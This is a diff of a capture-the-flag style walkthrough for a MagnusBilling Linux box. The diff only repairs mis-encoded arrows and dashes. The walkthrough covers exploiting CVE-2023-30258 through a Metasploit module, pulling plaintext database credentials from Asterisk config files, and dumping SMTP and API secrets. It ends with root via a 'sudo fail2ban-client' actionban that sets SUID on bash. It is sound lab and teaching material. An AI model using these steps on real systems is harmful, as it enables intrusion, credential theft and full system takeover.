@@ -4,31 +4,31 @@
 **OS:** Linux (Debian)
 **Difficulty:** Easy
 **Tech stack:** Apache 2.4.62, `/mbilling` (MagnusBilling), MariaDB, Asterisk Manager
-**Exploit chain:** MagnusBilling CVE-2023-30258 ? DB-config creds ? `sudo fail2ban-client` abuse ? SUID `bash` root
+**Exploit chain:** MagnusBilling CVE-2023-30258  DB-config creds  `sudo fail2ban-client` abuse  SUID `bash` root
 
 ---
 
 ## Attack Chain Overview
 
 ```
-nmap ? 22/tcp SSH, 80/tcp Apache, 3306/tcp MySQL, 5038/tcp Asterisk AMI
-    ?
-whatweb ? Apache redirects to /mbilling/  (MagnusBilling fingerprint)
-    ?
-Metasploit Â— exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
-    ?
+nmap  22/tcp SSH, 80/tcp Apache, 3306/tcp MySQL, 5038/tcp Asterisk AMI
+    
+whatweb  Apache redirects to /mbilling/  (MagnusBilling fingerprint)
+    
+Metasploit — exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
+    
 meterpreter as `asterisk`
-    ?
-grep /etc/asterisk/ ? res_config_mysql.conf leaks mbillingUser:BLOGYwvtJkI7uaX5
-    ?
-mysqldump mbilling ? pkg_user SHA-1 (uncrackable in rockyou) + SMTP / SIP / API creds
-    ?
-sudo -l ? NOPASSWD /usr/bin/fail2ban-client
-    ?
+    
+grep /etc/asterisk/  res_config_mysql.conf leaks mbillingUser:BLOGYwvtJkI7uaX5
+    
+mysqldump mbilling  pkg_user SHA-1 (uncrackable in rockyou) + SMTP / SIP / API creds
+    
+sudo -l  NOPASSWD /usr/bin/fail2ban-client
+    
 fail2ban-client set sshd action ... actionban "chmod +s /bin/bash" + banip <x>
-    ?
-bash -p ? root
-    ?
+    
+bash -p  root
+    
 cat /root/root.txt
 ```
 
@@ -37,10 +37,10 @@ cat /root/root.txt
 ## Table of Contents
 1. [Reconnaissance](#1-reconnaissance)
 2. [Web Triage](#2-web-triage)
-3. [Initial Access Â— MagnusBilling CVE-2023-30258](#3-initial-access--magnusbilling-cve-2023-30258)
+3. [Initial Access — MagnusBilling CVE-2023-30258](#3-initial-access--magnusbilling-cve-2023-30258)
 4. [Post-Exploitation Enumeration (`asterisk`)](#4-post-exploitation-enumeration-asterisk)
 5. [Database Looting](#5-database-looting)
-6. [Privilege Escalation Â— `sudo fail2ban-client` ? root](#6-privilege-escalation--sudo-fail2ban-client--root)
+6. [Privilege Escalation — `sudo fail2ban-client`  root](#6-privilege-escalation--sudo-fail2ban-client--root)
 7. [Root Flag](#7-root-flag)
 8. [Key Takeaways](#8-key-takeaways)
 
@@ -64,7 +64,7 @@ nmap -sVC -p22,80,3306,5038 $TARGET -oA service
 | 3306/tcp | MariaDB / MySQL | Bound to localhost from the outside |
 | 5038/tcp | Asterisk Call Manager (AMI) | PBX management socket |
 
-**Signal:** port `5038` + HTTP ? MagnusBilling (Asterisk-based VoIP billing frontend). That product has a well-known unauth RCE Â— CVE-2023-30258 Â— in the `icepay` module.
+**Signal:** port `5038` + HTTP  MagnusBilling (Asterisk-based VoIP billing frontend). That product has a well-known unauth RCE — CVE-2023-30258 — in the `icepay` module.
 
 ---
 
@@ -75,7 +75,7 @@ whatweb http://$TARGET/
 # Apache[2.4.62], HTTPServer[Debian Linux], RedirectLocation[./mbilling]
 ```
 
-Browser hits `/mbilling/` ? the MagnusBilling login page. No credentials needed; the RCE is pre-auth.
+Browser hits `/mbilling/`  the MagnusBilling login page. No credentials needed; the RCE is pre-auth.
 
 Directory brute just to confirm the app layout (optional):
 
@@ -88,7 +88,7 @@ feroxbuster -u http://$TARGET/mbilling/ \
 
 ---
 
-## 3. Initial Access â€” MagnusBilling CVE-2023-30258
+## 3. Initial Access — MagnusBilling CVE-2023-30258
 
 Metasploit ships the exploit module. Full playbook in [magnusbilling-rce.md](../../../exploits/web-rce/magnusbilling-rce.md).
 
@@ -121,7 +121,7 @@ uname -a
 
 ## 4. Post-Exploitation Enumeration (`asterisk`)
 
-First pass of the [Linux enumeration playbook](../../../playbooks/enumeration/linux.md) Â— system context + `sudo -l` + credential hunt.
+First pass of the [Linux enumeration playbook](../../../playbooks/enumeration/linux.md) — system context + `sudo -l` + credential hunt.
 
 ### System context & sudo
 ```bash
@@ -135,7 +135,7 @@ sudo -l
 # Defaults!/usr/bin/fail2ban-client !requiretty
 ```
 
-`fail2ban-client` NOPASSWD is the privesc lever Â— parked for step 6.
+`fail2ban-client` NOPASSWD is the privesc lever — parked for step 6.
 
 ### Credential hunt on disk
 
@@ -205,7 +205,7 @@ mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -e "SELECT * FROM mbilling.pkg_iax LI
 
 # SMTP creds (often reused)
 mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -e "SELECT * FROM mbilling.pkg_smtp;"
-# ? mail.magnusbilling.com  billing@magnusbilling.com  magnus  587
+#  mail.magnusbilling.com  billing@magnusbilling.com  magnus  587
 
 # REST API keys
 mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -e "SELECT * FROM mbilling.pkg_api;"
@@ -216,7 +216,7 @@ mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -e "SELECT * FROM mbilling.pkg_api;"
 root : d8c55b020bca07272d4cf3a46d693bb6ebafe3e1
 ```
 
-Raw SHA-1 ? hashcat mode 100:
+Raw SHA-1  hashcat mode 100:
 
 ```bash
 # What it does: attempt to crack the admin SHA-1 hash with Hashcat.
@@ -224,7 +224,7 @@ Raw SHA-1 ? hashcat mode 100:
 hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-Not in rockyou. Not worth deeper cracking Â— the privesc lever is already in `sudo -l`.
+Not in rockyou. Not worth deeper cracking — the privesc lever is already in `sudo -l`.
 
 Loot transfer from meterpreter:
 ```
@@ -234,7 +234,7 @@ meterpreter > download /tmp/mbilling_backup.sql
 
 ---
 
-## 6. Privilege Escalation Â— `sudo fail2ban-client` ? root
+## 6. Privilege Escalation — `sudo fail2ban-client`  root
 
 Full technique note: [fail2ban-sudo-privesc.md](../../../privesc/linux/fail2ban-sudo-privesc.md).
 
@@ -279,19 +279,19 @@ cat /root/passwordMysql.log
 
 ## 8. Key Takeaways
 
-- `/mbilling/` + port 5038 is the MagnusBilling fingerprint Â— CVE-2023-30258 before anything else.
+- `/mbilling/` + port 5038 is the MagnusBilling fingerprint — CVE-2023-30258 before anything else.
 - Asterisk boxes keep DB creds in plaintext at `/etc/asterisk/res_config_mysql.conf`. Always grep `/etc/` after landing as `asterisk`.
-- MagnusBilling's `pkg_user.password` is raw SHA-1 Â— attempt `hashcat -m 100` but don't sink hours into it; the privesc lever is usually elsewhere.
+- MagnusBilling's `pkg_user.password` is raw SHA-1 — attempt `hashcat -m 100` but don't sink hours into it; the privesc lever is usually elsewhere.
 - `fail2ban-client` under sudo is a wildcard-command primitive. Treat any `fail2ban-client` entry in `sudo -l` as instant root.
-- `bash -p` is what preserves the SUID-root EUID Â— `bash` alone resets it.
+- `bash -p` is what preserves the SUID-root EUID — `bash` alone resets it.
 
 ---
 
 ## Related Notes
-- [magnusbilling-rce.md](../../../exploits/web-rce/magnusbilling-rce.md) Â— exploit playbook
-- [fail2ban-sudo-privesc.md](../../../privesc/linux/fail2ban-sudo-privesc.md) Â— privesc playbook
-- [mysql](../../../tools/database/mysql.md) Â— DB enumeration tool note
-- [metasploit](../../../tools/exploitation/metasploit.md) Â— public-exploit delivery
-- [hashcat](../../../tools/creds/hashcat.md) Â— SHA-1 mode 100
-- [linux-enumeration.md](../../../playbooks/enumeration/linux.md) Â— post-foothold checklist
-- [nmap](../../../tools/recon/nmap.md), [whatweb](../../../tools/recon/whatweb.md), [feroxbuster](../../../tools/fuzz/feroxbuster.md) Â— recon
+- [magnusbilling-rce.md](../../../exploits/web-rce/magnusbilling-rce.md) — exploit playbook
+- [fail2ban-sudo-privesc.md](../../../privesc/linux/fail2ban-sudo-privesc.md) — privesc playbook
+- [mysql](../../../tools/database/mysql.md) — DB enumeration tool note
+- [metasploit](../../../tools/exploitation/metasploit.md) — public-exploit delivery
+- [hashcat](../../../tools/creds/hashcat.md) — SHA-1 mode 100
+- [linux-enumeration.md](../../../playbooks/enumeration/linux.md) — post-foothold checklist
+- [nmap](../../../tools/recon/nmap.md), [whatweb](../../../tools/recon/whatweb.md), [feroxbuster](../../../tools/fuzz/feroxbuster.md) — recon
